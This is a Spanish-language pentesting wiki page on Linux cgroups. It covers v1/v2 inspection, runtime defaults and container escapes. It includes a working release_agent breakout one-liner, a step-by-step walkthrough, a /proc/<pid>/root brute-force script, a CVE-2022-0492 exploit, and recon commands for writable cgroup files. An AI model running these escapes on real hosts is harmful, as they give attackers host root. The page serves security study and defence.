# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Los **control groups** de Linux son el mecanismo del kernel utilizado para agrupar procesos para fines de contabilidad, limitación, priorización y aplicación de políticas. Si los namespaces tratan principalmente de aislar la vista de los recursos, los cgroups tratan principalmente de controlar **cuánto** de esos recursos puede consumir un conjunto de procesos y, en algunos casos, **con qué clases de recursos** pueden interactuar. Los containers dependen constantemente de los cgroups, incluso cuando el usuario nunca los observa directamente, porque casi todos los runtimes modernos necesitan una forma de indicar al kernel: "estos procesos pertenecen a este workload y estas son las reglas de recursos que se les aplican".

Por este motivo, los container engines colocan un nuevo container en su propio subtree de cgroup. Una vez que el árbol de procesos se encuentra allí, el runtime puede limitar la memoria, restringir el número de PIDs, asignar un peso al uso de la CPU, regular la E/S y restringir el acceso a dispositivos. En un entorno de producción, esto es esencial tanto para la seguridad multi-tenant como para una higiene operativa básica. Un container sin controles de recursos significativos podría agotar la memoria, inundar el sistema con procesos o monopolizar la CPU y la E/S de formas que desestabilicen el host o los workloads vecinos.

Desde una perspectiva de seguridad, los cgroups son importantes por dos motivos distintos. En primer lugar, unos límites de recursos incorrectos o inexistentes permiten realizar denial-of-service attacks sencillos. En segundo lugar, algunas funciones de los cgroups, especialmente en configuraciones antiguas de **cgroup v1**, han creado históricamente potentes primitivas de breakout cuando podían escribirse desde el interior de un container.

## v1 Vs v2

Existen dos modelos principales de cgroups en uso. **cgroup v1** expone múltiples jerarquías de controladores, y los exploit writeups antiguos suelen centrarse en las semánticas extrañas y, en ocasiones, excesivamente potentes disponibles allí. **cgroup v2** introduce una jerarquía más unificada y, por lo general, un comportamiento más limpio. Las distribuciones modernas prefieren cada vez más cgroup v2, pero todavía existen entornos mixtos o legacy, lo que significa que ambos modelos siguen siendo relevantes al revisar sistemas reales.

La diferencia es importante porque algunas de las historias más conocidas de container breakout, como los abusos de **`release_agent`** en cgroup v1, están vinculadas específicamente al comportamiento de los cgroups antiguos. Un lector que encuentre un cgroup exploit en un blog y luego lo aplique ciegamente a un sistema moderno que solo utiliza cgroup v2 probablemente no entenderá correctamente qué es realmente posible en el target.

## Inspection

La forma más rápida de ver dónde se encuentra tu shell actual es:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
El archivo `/proc/self/cgroup` muestra las rutas de cgroup asociadas con el proceso actual. En un host moderno con cgroup v2, normalmente verás una entrada unificada. En hosts antiguos o híbridos, es posible que veas varias rutas de controladores v1. Una vez que conozcas la ruta, puedes inspeccionar los archivos correspondientes en `/sys/fs/cgroup` para consultar los límites y el uso actual.

En un host con cgroup v2, los siguientes comandos son útiles:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Estos archivos revelan qué controladores existen y cuáles se delegan a los cgroups secundarios. Este modelo de delegación es importante en entornos rootless y gestionados por systemd, donde el runtime quizá solo pueda controlar el subconjunto de funcionalidades de cgroups que la jerarquía principal delega.

## Laboratorio

Una forma de observar los cgroups en la práctica es ejecutar un contenedor con memoria limitada:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
También puedes probar un contenedor limitado por PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Estos ejemplos son útiles porque ayudan a conectar el flag del runtime con la interfaz de archivos del kernel. El runtime no aplica la regla por arte de magia; escribe la configuración relevante de cgroups y después deja que el kernel la aplique al árbol de procesos.

## Uso del Runtime

Docker, Podman, containerd y CRI-O dependen de cgroups como parte de su funcionamiento normal. Las diferencias normalmente no tienen que ver con si usan cgroups, sino con **qué valores predeterminados eligen**, **cómo interactúan con systemd**, **cómo funciona la delegación rootless** y **cuánto de la configuración se controla en el nivel del engine frente al nivel de la orquestación**.

En Kubernetes, las solicitudes y los límites de recursos terminan convirtiéndose en configuración de cgroups en el nodo. El recorrido desde el YAML del Pod hasta la aplicación por parte del kernel pasa por el kubelet, el runtime de CRI y el runtime de OCI, pero los cgroups siguen siendo el mecanismo del kernel que finalmente aplica la regla. En entornos Incus/LXC, los cgroups también se utilizan ampliamente, especialmente porque los system containers suelen exponer un árbol de procesos más completo y expectativas operativas más similares a las de una VM.

## Misconfiguraciones Y Escapes

La historia clásica de seguridad de cgroups es el mecanismo **`release_agent` de cgroup v1**, que permite escritura. En ese modelo, si un atacante podía escribir en los archivos de cgroup correctos, activar `notify_on_release` y controlar la ruta almacenada en `release_agent`, el kernel podía terminar ejecutando una ruta elegida por el atacante en los namespaces iniciales del host cuando el cgroup quedara vacío. Por eso los writeups antiguos prestan tanta atención a la posibilidad de escritura de los controladores de cgroup, las opciones de montaje y las condiciones de namespaces/capabilities.

Incluso cuando `release_agent` no está disponible, los errores de configuración de cgroups siguen siendo importantes. Un acceso demasiado amplio a dispositivos puede hacer que los dispositivos del host sean accesibles desde el contenedor. La ausencia de límites de memoria y de PID puede convertir una simple ejecución de código en un DoS del host. Una delegación débil de cgroups en escenarios rootless también puede inducir a los defensores a asumir que existe una restricción cuando el runtime en realidad nunca pudo aplicarla.

### Contexto de `release_agent`

La técnica `release_agent` solo se aplica a **cgroup v1**. La idea básica es que, cuando el último proceso de un cgroup termina y `notify_on_release=1` está establecido, el kernel ejecuta el programa cuya ruta está almacenada en `release_agent`. Esa ejecución ocurre en los **namespaces iniciales del host**, lo que convierte un `release_agent` modificable en una primitiva de escape del contenedor.

Para que la técnica funcione, el atacante generalmente necesita:

- una jerarquía **cgroup v1** modificable
- la capacidad de crear o utilizar un cgroup hijo
- la capacidad de establecer `notify_on_release`
- la capacidad de escribir una ruta en `release_agent`
- una ruta que se resuelva a un ejecutable desde el punto de vista del host

### PoC clásico

El PoC histórico de una sola línea es:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Este PoC escribe la ruta del payload en `release_agent`, activa la liberación del cgroup y luego vuelve a leer el archivo de salida generado en el host.

### Explicación paso a paso

La misma idea es más fácil de entender cuando se divide en pasos.

1. Crea y prepara un cgroup con permisos de escritura:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifica la ruta del host que corresponde al sistema de archivos del contenedor:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Deja un payload que será visible desde la ruta del host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Activar la ejecución haciendo que el cgroup quede vacío:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
El efecto es la ejecución del payload en el host con privilegios de root del host. En un exploit real, el payload normalmente escribe un archivo de prueba, genera un reverse shell o modifica el estado del host.

### Variante de ruta relativa mediante `/proc/<pid>/root`

En algunos entornos, la ruta del host al sistema de archivos del contenedor no es evidente o está oculta por el storage driver. En ese caso, la ruta del payload puede expresarse mediante `/proc/<pid>/root/...`, donde `<pid>` es un PID del host perteneciente a un proceso del contenedor actual. Esa es la base de la variante de fuerza bruta de ruta relativa:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
El truco relevante aquí no es el brute force en sí, sino la forma de la ruta: `/proc/<pid>/root/...` permite que el kernel resuelva un archivo dentro del filesystem del container desde el host namespace, incluso cuando la ruta de almacenamiento directa del host no se conoce de antemano.

### Variante de CVE-2022-0492

En 2022, CVE-2022-0492 mostró que escribir en `release_agent` en cgroup v1 no comprobaba correctamente `CAP_SYS_ADMIN` en el **initial** user namespace. Esto hizo que la técnica fuera mucho más accesible en kernels vulnerables, porque un proceso del container que pudiera montar una jerarquía de cgroups podía escribir en `release_agent` sin tener privilegios previos en el host user namespace.

Exploit mínimo:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
En un kernel vulnerable, el host ejecuta `/proc/self/exe` con privilegios de root del host.

Para un abuso práctico, empieza comprobando si el entorno todavía expone rutas de cgroup-v1 escribibles o acceso peligroso a dispositivos:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Si `release_agent` está presente y se puede escribir en él, ya estás en territorio de legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Si la propia ruta del cgroup no permite un escape, el siguiente uso práctico suele ser la denegación de servicio o el reconocimiento:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Estos comandos indican rápidamente si el workload tiene margen para ejecutar un fork-bomb, consumir memoria de forma agresiva o abusar de una interfaz de cgroup legacy con permisos de escritura.

## Checks

Al revisar un objetivo, el propósito de los checks de cgroup es determinar qué modelo de cgroup está en uso, si el contenedor puede ver rutas de controladores con permisos de escritura y si primitives antiguos de breakout, como `release_agent`, siguen siendo relevantes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Qué es interesante aquí:

- Si `mount | grep cgroup` muestra **cgroup v1**, los antiguos breakout writeups adquieren mayor relevancia.
- Si `release_agent` existe y es accesible, merece inmediatamente una investigación más profunda.
- Si la jerarquía de cgroups visible permite escritura y el container también tiene capabilities potentes, el entorno merece una revisión mucho más exhaustiva.

Si descubres **cgroup v1**, mounts de controllers con permisos de escritura y un container que también tiene capabilities potentes o una protección seccomp/AppArmor débil, esa combinación merece especial atención. Los cgroups suelen tratarse como un tema aburrido de gestión de recursos, pero históricamente han formado parte de algunas de las container escape chains más instructivas, precisamente porque la frontera entre el "control de recursos" y la "influencia sobre el host" no siempre era tan clara como se suponía.

## Defaults del Runtime

| Runtime / platform | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual habitual |
| --- | --- | --- | --- |
| Docker Engine | Habilitado de forma predeterminada | Los containers se colocan automáticamente en cgroups; los límites de recursos son opcionales, a menos que se establezcan mediante flags | omitir `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Habilitado de forma predeterminada | `--cgroups=enabled` es el valor predeterminado; los valores predeterminados del namespace de cgroups varían según la versión de cgroups (`private` en cgroup v2, `host` en algunas configuraciones de cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, acceso relajado a devices, `--privileged` |
| Kubernetes | Habilitado por el runtime de forma predeterminada | Los Pods y containers se colocan en cgroups mediante el runtime del nodo; el control detallado de recursos depende de `resources.requests` / `resources.limits` | omitir resource requests/limits, acceso privilegiado a devices, misconfiguración del runtime a nivel de host |
| containerd / CRI-O | Habilitado de forma predeterminada | los cgroups forman parte de la gestión normal del ciclo de vida | configuraciones directas del runtime que relajan los controles de devices o exponen interfaces legacy de cgroup v1 con permisos de escritura |

La distinción importante es que la **existencia de cgroups** suele ser predeterminada, mientras que las **restricciones útiles de recursos** normalmente son opcionales, a menos que se configuren explícitamente.
{{#include ../../../../banners/hacktricks-training.md}}
